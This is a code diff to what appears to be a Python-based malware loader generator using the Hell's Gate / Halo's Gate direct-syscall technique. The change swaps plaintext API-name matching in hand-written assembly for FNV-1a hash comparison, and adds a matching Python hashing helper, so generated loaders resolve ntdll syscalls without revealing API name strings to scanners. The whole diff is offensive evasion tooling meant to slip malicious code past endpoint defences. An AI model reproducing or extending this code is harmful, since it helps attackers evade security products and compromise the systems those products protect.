@@ -5,7 +5,7 @@ import os
 import subprocess
 from c.utils.typedefs import typedefs
 
-class halosgate:
+class halosgatehash:
     def __init__(self, arguments):
         self.name = ''.join(random.SystemRandom().choice(string.ascii_lowercase) for _ in range(16))
         self.handle = 'LoadLibrary'
@@ -119,8 +119,32 @@ getApiAddrLoop:
 	mov edi, [r11+rax*4]    ; EDI = RVA NameString = [&NamePointerTable + (Counter * 4)]
 	add rdi, r8             ; RDI = &NameString    = RVA NameString + &module.dll
 	mov rsi, rdx            ; RSI = Address of API Name String to match on the Stack  (reset to start of string)
-	repe cmpsb              ; Compare strings at RDI & RSI
-	je getApiAddrFin        ; If match then we found the API string. Now we need to find the Address of the API
+    
+    push rax;
+    push rcx;
+    push rdx;
+
+hash_compare:
+    mov eax, 0x811C9DC5
+    mov rdx, rdi
+
+.loop:
+    movzx ecx, byte [rdx]
+    test ecx, ecx
+    jz .done
+
+    xor eax, ecx
+    imul eax, eax, 0x01000193
+    inc rdx
+    jmp .loop
+
+.done:
+    cmp eax, esi
+    pop rdx;
+    pop rcx;
+    pop rax;
+    je getApiAddrFin
+    
 	inc rax
 	jmp short getApiAddrLoop
 
@@ -238,7 +262,7 @@ EXTERN_C PVOID getExOrdinalTable(
 
 EXTERN_C PVOID getApiAddr(
 	IN DWORD apiNameStringLen,
-	IN LPSTR apiNameString,
+	IN DWORD apiNameHash,
 	IN PVOID moduleAddr,
 	IN PVOID ExExAddressTable,
 	IN PVOID ExNamePointerTable,
@@ -286,7 +310,17 @@ __attribute__((constructor)) void {self.name}(){{
                 resolved[apicall] = apicall
             else:
                 resolved[apicall] = f"""
-    DWORD {apicall}_ssn = findSyscallNumber(getApiAddr({len(apicall)}, "{apicall}", ntdll, ntdllExAddrTbl, ntdllExNamePtrTbl, ntdllExOrdinalTbl));
+    DWORD {apicall}_ssn = findSyscallNumber(getApiAddr({len(apicall)}, {self.hashstring(apicall)}, ntdll, ntdllExAddrTbl, ntdllExNamePtrTbl, ntdllExOrdinalTbl));
     HellsGate({apicall}_ssn);
     HellDescent"""
         return resolved
+
+    def hashstring(self, functionName) -> int:
+        value = 0x811C9DC5
+
+        for character in functionName:
+            if character == 0:
+                break
+            value = ((value ^ ord(character)) * 0x01000193) & 0xFFFFFFFF
+
+        return value
